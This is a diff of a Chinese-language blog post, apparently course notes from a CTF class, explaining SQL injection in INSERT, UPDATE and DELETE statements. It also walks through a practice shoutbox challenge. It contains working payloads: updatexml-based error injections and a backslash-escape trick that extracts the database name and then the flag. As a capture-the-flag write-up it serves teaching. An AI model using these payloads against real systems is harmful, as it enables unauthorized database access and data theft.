@@ -63,37 +63,63 @@
   <div class="post-content">
     <p>本文是对安全牛《CTF从入门到提升》课程课时7的记录</p>
 <p>insert,update,delete的注入和select注入类似，就不细讲了，主要讲例题</p>
-<h2 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h2><p>先看看insert基本语法:</p>
+<h2 id="insert注入">insert注入</h2>
+<p>先看看insert基本语法:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">'user'</span>,<span class="string">'passwd'</span>);</span><br></pre></td></tr></table></figure>
 <p>报错注入:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">'attacker'</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>()),<span class="number">0</span>),<span class="string">'passwd'</span>);</span><br></pre></td></tr></table></figure>
 <p>没有报错注入时也不一定要用延时注入，可以将想要得到的内容写入表中，在其他地方查看（详见<a href="https://www.cnblogs.com/Tkitn/p/11649255.html" target="_blank" rel="noopener">网鼎杯第四场comment个人笔记</a>）</p>
-<p>二次注入:<br><a href="https://www.jianshu.com/p/3fe7904683ac" target="_blank" rel="noopener">https://www.jianshu.com/p/3fe7904683ac</a></p>
-<h2 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h2><p>update基本语法:</p>
+<p>二次注入:<br>
+<a href="https://www.jianshu.com/p/3fe7904683ac" target="_blank" rel="noopener">https://www.jianshu.com/p/3fe7904683ac</a></p>
+<h2 id="update注入">update注入</h2>
+<p>update基本语法:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> <span class="keyword">password</span>=<span class="string">'password'</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
 <p>报错注入:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> <span class="keyword">password</span>=<span class="string">'password'</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>()),<span class="number">0</span>) <span class="keyword">or</span> <span class="string">'1'</span></span><br></pre></td></tr></table></figure>
-
 <p>同样可以将想要的内容写入表中，在其他地方查看</p>
-<h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p>delete基本语法:</p>
+<h2 id="delete注入">delete注入</h2>
+<p>delete基本语法:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
 <p>报错注入:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">2</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>()),<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="http://chall.tasteless.eu/level15/index.php" target="_blank" rel="noopener">http://chall.tasteless.eu/level15/index.php</a><br>可以看到有一个类似留言版的东西，可以提交name和text留言，然后留言板上会显示name:text,<br>并且底下有<br>Hint: table level15_flag column flag<br>显然可以从level15_flag的flag列获得flag</p>
+<h2 id="例题">例题</h2>
+<p><a href="http://chall.tasteless.eu/level15/index.php" target="_blank" rel="noopener">http://chall.tasteless.eu/level15/index.php</a><br>
+可以看到有一个类似留言版的东西，可以提交name和text留言，然后留言板上会显示name:text,<br>
+并且底下有<br>
+Hint: table level15_flag column flag<br>
+显然可以从level15_flag的flag列获得flag</p>
 <p>可以猜测sql语句是这样的</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> shoutbox(<span class="keyword">name</span>,<span class="built_in">text</span>) <span class="keyword">values</span>(<span class="string">'user1'</span>,<span class="string">'hello!'</span>);</span><br></pre></td></tr></table></figure>
 <ol>
-<li><p>首先尝试插入’<br>提交name=’&amp;text=xxx<br>显示’: adfaf<br>‘应该是被转义了</p>
+<li>
+<p>首先尝试插入’<br>
+提交name=‘&amp;text=xxx<br>
+显示’: adfaf<br>
+'应该是被转义了</p>
 </li>
-<li><p>尝试使用注释<br>提交name=’#&amp;text=xxx<br>显示’#: xxx<br>注释也没有生效<br>想想也正常，如果’被转义的话，#在引号里是会被当成字符的</p>
+<li>
+<p>尝试使用注释<br>
+提交name=‘#&amp;text=xxx<br>
+显示’#: xxx<br>
+注释也没有生效<br>
+想想也正常，如果’被转义的话，#在引号里是会被当成字符的</p>
 </li>
-<li><p>使用\转义<br>接下来想到用\去转义掉原有的’<br>提交name=&amp;text=abc<br>这时的sql语句应该是</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> shoutbox(<span class="keyword">name</span>,<span class="built_in">text</span>) <span class="keyword">values</span>(<span class="string">'\'</span>,<span class="string">'abc'</span>);</span><br></pre></td></tr></table></figure>
-<p>发现显示了上一次提交的内容<br>猜测这是sql语句出现了错误，\产生了效果<br>这里因为提交的’会被转义掉，所以不能使用’去闭合，但我们可以使用,和()构造这样的sql语句:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> shoutbox(<span class="keyword">name</span>,<span class="built_in">text</span>) <span class="keyword">values</span>(<span class="string">'\'</span>,<span class="string">',database())#'</span>)</span><br></pre></td></tr></table></figure>
-<p>也就是提交name=&amp;text=,database())#<br>这时显示’, : tasteless_chall<br>注入成功<br>提交name=&amp;text=,(select group_concat(flag) from level15_flag))# 拿到flag</p>
+<li>
+<p>使用\转义<br>
+接下来想到用\去转义掉原有的’<br>
+提交name=&amp;text=abc<br>
+这时的sql语句应该是</p>
 </li>
 </ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> shoutbox(<span class="keyword">name</span>,<span class="built_in">text</span>) <span class="keyword">values</span>(<span class="string">'\'</span>,<span class="string">'abc'</span>);</span><br></pre></td></tr></table></figure>
+<p>发现显示了上一次提交的内容<br>
+猜测这是sql语句出现了错误，\产生了效果<br>
+这里因为提交的’会被转义掉，所以不能使用’去闭合，但我们可以使用,和()构造这样的sql语句:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> shoutbox(<span class="keyword">name</span>,<span class="built_in">text</span>) <span class="keyword">values</span>(<span class="string">'\'</span>,<span class="string">',database())#'</span>)</span><br></pre></td></tr></table></figure>
+<p>也就是提交name=&amp;text=,database())#<br>
+这时显示’, : tasteless_chall<br>
+注入成功<br>
+提交name=&amp;text=,(select group_concat(flag) from level15_flag))# 拿到flag</p>
 
   </div>
   <div class="post-meta">
